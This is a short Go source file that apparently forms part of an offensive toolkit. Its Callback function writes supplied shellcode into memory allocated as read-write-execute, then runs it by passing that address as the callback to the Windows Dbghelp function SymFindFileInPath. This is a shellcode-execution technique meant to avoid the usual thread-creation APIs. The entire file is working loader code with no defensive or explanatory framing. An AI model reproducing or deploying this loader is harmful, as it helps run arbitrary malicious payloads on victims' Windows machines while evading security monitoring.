package TT

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	dummy [256]byte
)

type Finfo struct {
	timestamp int
	size      int
}

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	NULL                   = 0
	TRUE                   = 1
	SSRVOPT_DWORDPTR       = 0x00000004
)

var (
	kernel32               = syscall.MustLoadDLL("kernel32.dll")
	ntdll                  = syscall.MustLoadDLL("ntdll.dll")
	Dbghelp                = syscall.MustLoadDLL("Dbghelp.dll")
	VirtualAlloc           = kernel32.MustFindProc("VirtualAlloc")
	GetCurrentProcess      = kernel32.MustFindProc("GetCurrentProcess")
	SymInitialize          = Dbghelp.MustFindProc("SymInitialize")
	SymSrvGetFileIndexInfo = Dbghelp.MustFindProc("SymSrvGetFileIndexInfo")
	SymFindFileInPath      = Dbghelp.MustFindProc("SymFindFileInPath")
	RtlMoveMemory          = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	hProcess, _, _ := GetCurrentProcess.Call()
	SymInitialize.Call(hProcess, NULL, TRUE)
	finfo := Finfo{}
	p1, _ := syscall.UTF16PtrFromString("c:\\windows\\system32\\kernel32.dll")
	_, err3, err4 := SymSrvGetFileIndexInfo.Call(uintptr(unsafe.Pointer(p1)), (uintptr)(unsafe.Pointer(&finfo)), NULL)
	p2, _ := syscall.UTF16PtrFromString("c:\\windows\\system32")
	p3, _ := syscall.UTF16PtrFromString("kernel32.dll")
	_, err1, err2 := SymFindFileInPath.Call(
		hProcess,
		uintptr(unsafe.Pointer(p2)),
		uintptr(unsafe.Pointer(p3)),
		(uintptr)(unsafe.Pointer(&finfo.timestamp)),
		(uintptr)(unsafe.Pointer(&finfo.size)),
		0,
		SSRVOPT_DWORDPTR,
		(uintptr)(unsafe.Pointer(&dummy)),
		addr,
		NULL,
	)
	fmt.Println(err1, err2)
	fmt.Println(err3, err4)
}
